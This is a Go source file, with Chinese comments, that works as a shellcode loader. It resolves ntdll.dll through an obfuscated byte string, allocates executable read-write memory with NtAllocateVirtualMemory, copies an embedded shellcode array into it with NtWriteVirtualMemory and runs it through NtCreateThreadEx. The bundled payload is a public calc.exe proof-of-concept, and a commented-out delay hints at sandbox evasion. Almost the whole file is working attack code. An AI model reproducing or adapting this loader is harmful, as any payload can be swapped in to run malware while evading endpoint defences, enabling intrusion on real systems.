package main

import (
	"syscall"
	"unsafe"
)

/*
	 API调用链
	NTAllocateVirtualMemory ->  ntWriteVirtualMemory -> NTCreateThreadEx
*/

var(
	ntdll = syscall.NewLazyDLL(string([]byte{'n','t','d','l','l','.','d','l','l'}))
	procNTAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	procNTWriteVirtualMemory = ntdll.NewProc("NtWriteVirtualMemory")
	procNTCreateThreadEx = ntdll.NewProc("NtCreateThreadEx")
)

func NTAllocateVirtualMemory(hProcess uintptr, lpAddress *uintptr, zerobits uintptr, dwSize *uint32, flAllocationType uint32, flProtect uint32){
	_,_,err := syscall.Syscall6(procNTAllocateVirtualMemory.Addr(), 6, uintptr(hProcess), uintptr(unsafe.Pointer(lpAddress)), uintptr(zerobits), uintptr(unsafe.Pointer(dwSize)), uintptr(flAllocationType), uintptr(flProtect))
	print(err)
	print("SYSCALL: NtAllocateVirtualMemory", "hProcess=", hProcess, ", ", "lpAddress=", lpAddress, ", ", "zerobits=", zerobits, ", ", "dwSize=", dwSize, ", ", "flAllocationType=", flAllocationType, ", ", "flProtect=", flProtect,"\n")
	return
}

func NTWriteVirtualMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr){
	_,_,err := syscall.Syscall6(procNTWriteVirtualMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	print(err)
	print("SYSCALL: NtWriteVirtualMemory", "hProcess=", hProcess, ", ", "lpBaseAddress=", lpBaseAddress, ", ", "lpBuffer=", lpBuffer, ", ", "nSize=", nSize, ", ", "lpNumberOfBytesWritten=", lpNumberOfBytesWritten,"\n")
	return
}


func NTCreateThreadEx(hThread *uintptr, desiredaccess uintptr, objattrib uintptr, processhandle uintptr, lpstartaddr uintptr, lpparam uintptr, createsuspended uintptr, zerobits uintptr, sizeofstack uintptr, sizeofstackreserve uintptr, lpbytesbuffer uintptr){
	_,_,err := syscall.Syscall12(procNTCreateThreadEx.Addr(), 11, uintptr(unsafe.Pointer(hThread)), uintptr(desiredaccess), uintptr(objattrib), uintptr(processhandle), uintptr(lpstartaddr), uintptr(lpparam), uintptr(createsuspended), uintptr(zerobits), uintptr(sizeofstack), uintptr(sizeofstackreserve), uintptr(lpbytesbuffer), 0)
	print(err)
	print("SYSCALL: NtCreateThreadEx(", "hThread=", hThread, ", ", "desiredaccess=", desiredaccess, ", ", "objattrib=", objattrib, ", ", "processhandle=", processhandle, ", ", "lpstartaddr=", lpstartaddr, ", ", "lpparam=", lpparam, ", ", "createsuspended=", createsuspended, ", ", "zerobits=", zerobits, ", ", "sizeofstack=", sizeofstack, ", ", "sizeofstackreserve=", sizeofstackreserve, ", ", "lpbytesbuffer=", lpbytesbuffer,"\n")
	return
}

func main(){
	//time.Sleep(10 *time.Second)
	var shellcode = []byte{
		//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}

	regionsize := uint32(len(shellcode)) //获取shellcode长度
	var baseA uintptr
	// 申请一个读写权限的内存baseA
	NTAllocateVirtualMemory(uintptr(0xffffffffffffffff),
		&baseA,
		0,
		&regionsize,
		uint32(uintptr(0x00001000)|uintptr(0x00002000)),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	var written uintptr
	// 将shellcode写入内存baseA
	NTWriteVirtualMemory(uintptr(0xffffffffffffffff), baseA, &shellcode[0], uintptr(len(shellcode)), &written)


//	syscall.Syscall(uintptr(baseA),0,0,0,0)
	var hhosthread uintptr
	NTCreateThreadEx(
		&hhosthread,
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		baseA,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	for i:=0;i<100;i++{
		//
	}
	_ ,_ = syscall.WaitForSingleObject(syscall.Handle(hhosthread),0xffffffff)


}
